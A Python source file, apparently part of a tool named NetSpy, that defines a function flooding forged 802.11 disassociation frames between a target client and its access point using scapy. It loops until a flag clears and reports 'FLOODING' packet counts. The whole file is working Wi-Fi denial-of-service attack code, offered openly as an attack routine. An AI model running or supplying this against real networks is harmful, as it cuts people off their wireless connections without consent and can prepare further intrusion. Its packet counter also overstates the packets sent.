# ===========================================================================
# NetSpy - Network Traffic Monitor & Security Analyzer
# Copyright (C) 2026 Mehadi Hasan
# Licensed under GNU GPL v3
# ===========================================================================

from scapy.layers.dot11 import Dot11, RadioTap, Dot11Disas
from scapy.sendrecv import sendp


def send_deauth(interface: str, target_mac: str, gateway_mac: str,
                is_attacking_flag: callable, write_to_terminal: callable):

    dot11_ap = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    pkt_ap = RadioTap() / dot11_ap / Dot11Disas(reason=7)

    # Client → AP disassociation
    dot11_cl = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
    pkt_cl = RadioTap() / dot11_cl / Dot11Disas(reason=7)

    count = 0
    while is_attacking_flag():
        try:
            sendp(pkt_ap, iface=interface, count=10, inter=0.01, verbose=False)
            sendp(pkt_cl, iface=interface, count=10, inter=0.01, verbose=False)
            count += 20
            if count % 100 == 0:
                write_to_terminal(f"FLOODING: {count * 2} packets injected")
        except Exception:
            break

    write_to_terminal("ATTACK_STOPPED: Target is free.")